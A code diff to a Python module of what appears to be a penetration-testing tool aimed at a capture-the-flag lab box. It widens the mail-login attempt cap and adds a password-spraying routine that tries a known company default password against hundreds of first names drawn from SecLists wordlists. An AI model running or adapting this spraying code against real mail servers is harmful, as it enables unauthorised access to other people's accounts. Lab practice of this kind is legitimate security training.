@@ -27,7 +27,7 @@ from ...core import utils
 from ...core.report import HostReport, Finding
 from ...data import knowledge
 
-_MAX_ATTEMPTS = 200
+_MAX_ATTEMPTS = 350
 _MAX_MSGS = 25
 _TIMEOUT = 6            # per mail connection — bounds the whole pass
 _COMMON = ["admin", "administrator", "root", "info", "support", "test", "mail"]
@@ -106,6 +106,11 @@ def _candidate_users(host: HostReport) -> List[str]:
         for m in re.findall(r"([A-Za-z0-9._%+-]+)@", f.title + " " + (f.detail or "")):
             users.append(m)
     users += _COMMON
+    # CREDENTIAL REUSE: a company-wide default password ("Enigma2024!" for all new
+    # starters) means OTHER employees still use it. Spray it across a real
+    # first-name list to find the next mailbox — that's the actual pivot on
+    # default-password boxes (HTB Enigma), not chasing a patched web CVE.
+    users += _firstnames()
     # dedupe, keep order, cap
     seen, out = set(), []
     for u in users:
@@ -113,7 +118,30 @@ def _candidate_users(host: HostReport) -> List[str]:
         if u and u.lower() not in seen:
             seen.add(u.lower())
             out.append(u)
-    return out[:40]
+    return out[:_MAX_ATTEMPTS]
+
+
+def _firstnames() -> List[str]:
+    """A bundled common-first-name list (+ SecLists names if present) for the
+    default-password reuse spray. Capped so the mail pass stays bounded."""
+    names: List[str] = []
+    paths = [os.path.join(os.path.dirname(__file__), "..", "..", "data",
+                          "wordlists", "firstnames.txt")]
+    for extra in ("Usernames/Names/malenames-usa-top1000.txt",
+                  "Usernames/Names/femalenames-usa-top1000.txt"):
+        for root in (os.path.expanduser("~/Documents/Wordlists/SecLists"),
+                     "/usr/share/seclists"):
+            paths.append(os.path.join(root, extra))
+    for p in paths:
+        try:
+            with open(p, "r", errors="replace") as fh:
+                names += [ln.strip().lower() for ln in fh
+                          if ln.strip() and not ln.startswith("#")]
+        except OSError:
+            continue
+        if len(names) >= 300:
+            break
+    return list(dict.fromkeys(names))[:300]
 
 
 def _imap(ip, port, user, pw):
